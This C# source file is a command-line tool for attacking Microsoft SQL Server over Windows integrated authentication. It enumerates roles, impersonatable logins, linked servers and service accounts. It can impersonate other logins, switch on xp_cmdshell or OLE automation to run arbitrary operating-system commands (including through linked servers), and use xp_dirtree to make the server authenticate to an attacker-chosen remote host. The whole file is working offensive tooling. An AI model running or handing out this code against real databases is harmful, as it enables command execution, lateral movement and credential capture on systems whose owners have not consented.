// MSSQL clinet that is using windows integrated authentication (kerberos) in order to enumerate mssql instance and abuse
using System;
using System.Data.SqlClient;
using System.Collections.Generic;


namespace SQL
{
    internal class Program
    {
        static List<object> RunQuery(SqlConnection con, String query)
        {
            SqlCommand cmd = new SqlCommand(query, con);
            SqlDataReader runner = cmd.ExecuteReader();
            var results = new List<object>();
            while (runner.Read())
            {
                results.Add(runner[0]);
            }
            runner.Close();
            return results;
        }

        static void RunAs(SqlConnection con, String user) 
        {
            String query = $"EXECUTE AS LOGIN = '{user}';";
            try
            {
                RunQuery(con, query);
            } catch (Exception ex) 
            {
                Console.WriteLine($"[!] Exception: {ex.Message}");
                return;
            }
        }

        static void ExecCmd(SqlConnection con, String os_cmd, String method, String link) 
        {
            String query1, query2;
            if (method == "standard")
            {
                Console.WriteLine($"[+] Attempting to enable xp_cmdshell on server {link}");
                if (!string.IsNullOrEmpty(link))
                {
                    query1 = $"EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT {link}; EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT {link}";
                    query2 = $"EXEC ('xp_cmdshell \"{os_cmd}\"') AT {link};";
                }
                else
                {
                    query1 = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;";
                    query2 = $"EXEC xp_cmdshell \"{os_cmd}\";";
                }

                try
                {
                    RunQuery(con, query1);
                    var results = RunQuery(con, query2);
                    Console.WriteLine($"\tResult:\n{results[0]}");
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[!] Exception: {ex.Message}");
                    return;
                }
            }
            else if (method == "ole")
            {
                Console.WriteLine($"[+] Attempting to use OLE object for code execution on server {link}");
                if (!string.IsNullOrEmpty(link))
                {
                    query1 = $"EXEC ('sp_configure ''Ole Automation Procedures'', 1; RECONFIGURE;') AT {link}";
                    query2 = $"EXEC ('DECLARE @mshll INT; EXEC sp_oacreate ''wscript.shell'', @mshll OUTPUT; EXEC sp_oamethod @mshll, ''run'', null, ''cmd /c \"{os_cmd}\"'';') AT {link}";
                }
                else
                {
                    query1 = "EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;";
                    query2 = $"DECLARE @mshll INT; EXEC sp_oacreate 'wscript.shell', @mshll OUTPUT; EXEC sp_oamethod @mshll, 'run', null, 'cmd /c \"{os_cmd}\"';";
                }

                try
                {
                    RunQuery(con, query1);
                    RunQuery(con, query2);
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[!] Exception: {ex.Message}");
                    return;
                }
            }
        }

        static void ExecDirtree(SqlConnection con, String remote_host, String link)
        {
            // Add other procedures as well, xp_dirtree may be disabled...
            Console.WriteLine($"[+] Executing xp_dirtree against: {remote_host}");
            String query = $"EXEC master..xp_dirtree \"\\\\{remote_host}\\\\test\";";

            if (!string.IsNullOrEmpty(link))
            {
                query = $"EXEC ('master..xp_dirtree \"\\\\{remote_host}\\\\test\"') AT {link};";
            }

            RunQuery(con, query);
        }

        static void CheckSA(SqlConnection con, String link)
        {
            Console.WriteLine($"[+] Checking with which service accounts the DB process is running on server {link}");
            String query = "SELECT service_account FROM sys.dm_server_services;";

            if (!string.IsNullOrEmpty(link))
            {
                query = $"SELECT * from openquery(\"{link}\", '{query}')";
            }
            try
            {
                var results = RunQuery(con, query);
                foreach (var res in results)
                {
                    Console.WriteLine($"\tMSSQL running as: {res}");
                }
            }
            catch (Exception ex) 
            {
                Console.WriteLine($"[!] Exception: {ex.Message}");
                return;
            }
        }

        static void CheckUser(SqlConnection con, String link)
        {

            Console.WriteLine($"[+] Checking user information on server {link}");
            String query = "SELECT SYSTEM_USER;";

            if (!string.IsNullOrEmpty(link)) {
                query = $"SELECT * from openquery(\"{link}\", '{query}')";
            }

            var results = RunQuery(con, query);
            foreach (var res in results) {
                Console.WriteLine($"\tLogged in as: {res}");
            }
        }

        static void CheckLinks(SqlConnection con, String link)
        {
            Console.WriteLine($"[+] Checking for linked SQL instances on server {link}");
            String query = "EXEC sp_linkedservers";

            if (!string.IsNullOrEmpty(link))
            {
                query = $"SELECT * from openquery(\"{link}\", '{query}')";
            }

            var results = RunQuery(con, query);
            foreach (var res in results)
            {
                Console.WriteLine($"\tLink: {res}");
            }
        }

        static void CheckImpersonate(SqlConnection con, String link) 
        {
            Console.WriteLine($"[+] Checking logins that allow impersonation on server {link}");

            String query = "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'";

            if (!string.IsNullOrEmpty(link))
            {
                query = $"SELECT * from openquery(\"{link}\", 'SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = ''IMPERSONATE''')";
            }

            var results = RunQuery(con, query);
            foreach (var res in results)
            {
                Console.WriteLine($"\tLogin: {res}");
            }
        }

        static void CheckRoles(SqlConnection con, String link)
        {
            List<string> roles = new List<string> { "public", "sysadmin", "serveradmin", "securityadmin", "setupadmin", "processadmin", "diskadmin", "dbcreator", "bulkadmin" };

            Console.WriteLine($"[+] Checking role memberships on server {link}");

            foreach (string role in roles) 
            {
                String query = $"SELECT IS_SRVROLEMEMBER('{role}');";

                if (!string.IsNullOrEmpty(link))
                {
                    query = $"SELECT * from openquery(\"{link}\", 'SELECT IS_SRVROLEMEMBER(''{role}'');')";
                }

                var results = RunQuery(con, query);
                Int32 role_id = Int32.Parse(results[0].ToString());
                if (role_id == 1)
                {
                    Console.WriteLine($"\tUser has: {role} privileges");
                }
            }
        }

        static void Help() 
        {
            Console.WriteLine("[!] Please provide SQL host to connect to, operation and any other needed params");
            Console.WriteLine("Available options");
            Console.WriteLine("--host       ->  MSSQL DB Host, always required");
            Console.WriteLine("--operation  ->  Operation to perform: enum, exec, exec-ole, dirtree, query");
            Console.WriteLine("--cmd        ->  OS command for code execution, required for: exec, exec-ole");
            Console.WriteLine("--as-user    ->  Impersonate the provided user if possible, required for: exec, exec-ole");
            Console.WriteLine("--rhost      ->  Remote host for connection, atm only trough xp_dirtree");
            Console.WriteLine("--link       ->  Linked server");
            Console.WriteLine("--raw        ->  Raw SQL query to execute");
            Console.WriteLine("\nNote: exec uses xp_cmdshell, exec-ole uses sp_OACreate and sp_OAMethod");
            Environment.Exit(0);
        }


        static Dictionary<string, string> Parser(string[] args)
        {
            if (args.Length == 0)
            {
                Help();
            }
            var options = new Dictionary<string, string>();
            options.Add("host", "");
            options.Add("operation", "");
            options.Add("cmd", "");
            options.Add("as-user", "");
            options.Add("rhost", "");
            options.Add("link", "");
            options.Add("raw", "");

            for (int i = 0; i < args.Length; i++)
            {
                if (args[i].StartsWith("--"))
                {
                    string key = args[i].Substring(2); 
                    if (i + 1 < args.Length && !args[i + 1].StartsWith("--"))
                    {
                        switch (key) 
                        {
                            case "host":
                                options["host"] = args[i + 1];
                                break;

                            case "operation":
                                options["operation"] = args[i + 1];
                                break;

                            case "cmd":
                                options["cmd"] = args[i + 1];
                                break;

                            case "as-user":
                                options["as-user"] = args[i + 1];
                                break;

                            case "rhost":
                                options["rhost"] = args[i + 1];
                                break;

                            case "link":
                                // Check if there is a dot in the name and add brackets
                                string link;
                                if (args[i + 1].Contains("."))
                                {
                                    link = $"[{args[i + 1]}]";
                                }
                                else 
                                {
                                    link = args[i + 1];
                                }
                                options["link"] = link;
                                break;

                            case "raw":
                                options["raw"] = args[i + 1];
                                break;

                            default:
                                break;
                        }
                        i++; 
                    }
                }
            }
            return options;
        }


        static void Main(string[] args)
        {
            var options = Parser(args);

            String sql_host = options["host"];
            String operation = options["operation"];

            if (string.IsNullOrEmpty(sql_host) || string.IsNullOrEmpty(operation)) Help();


            String db_name = "master";

            String conString = "Server = " + sql_host + "; Database = " + db_name + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);

            try
            {
                con.Open();
                Console.WriteLine("[+] Authenticated");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error opening connection: {ex.Message}");
                return;
            }

            String method, os_cmd, as_user;
            switch (operation) 
            {
                case "enum":
                    as_user = options["as-user"];
                    if (!string.IsNullOrEmpty(as_user)) RunAs(con, as_user);

                    CheckUser(con, options["link"]);
                    CheckRoles(con, options["link"]);
                    CheckImpersonate(con, options["link"]);
                    CheckLinks(con, options["link"]);
                    CheckSA(con, options["link"]);
                    break;

                case "dirtree":
                    as_user = options["as-user"];
                    if (!string.IsNullOrEmpty(as_user)) RunAs(con, as_user);

                    String remote_host = options["rhost"];
                    if (string.IsNullOrEmpty(remote_host)) Help();

                    ExecDirtree(con, remote_host, options["link"]);
                    break;

                case "exec":
                    os_cmd = options["cmd"];
                    as_user = options["as-user"];
                    if (string.IsNullOrEmpty(os_cmd)) Help();
                    if (!string.IsNullOrEmpty(as_user)) RunAs(con, as_user);

                    method = "standard";
                    ExecCmd(con, os_cmd, method, options["link"]);
                    break;

                case "exec-ole":
                    os_cmd = options["cmd"];
                    as_user = options["as-user"];
                    if (string.IsNullOrEmpty(os_cmd)) Help();
                    if (!string.IsNullOrEmpty(as_user)) RunAs(con, as_user);

                    method = "ole";
                    ExecCmd(con, os_cmd, method, options["link"]);
                    break;

                case "query":
                    String query = options["raw"];
                    as_user = options["as-user"];
                    if (string.IsNullOrEmpty(query)) Help();
                    if (!string.IsNullOrEmpty(as_user)) RunAs(con, as_user);

                    Console.WriteLine("[+] Executing raw query");
                    var results = RunQuery(con, query);
                    foreach (var res in results)
                    {
                        Console.WriteLine(res);
                    }
                    break;

                default:
                    Console.WriteLine($"[!] {operation} is not a valid option!");
                    break;
            }

            con.Close();
        }
    }
}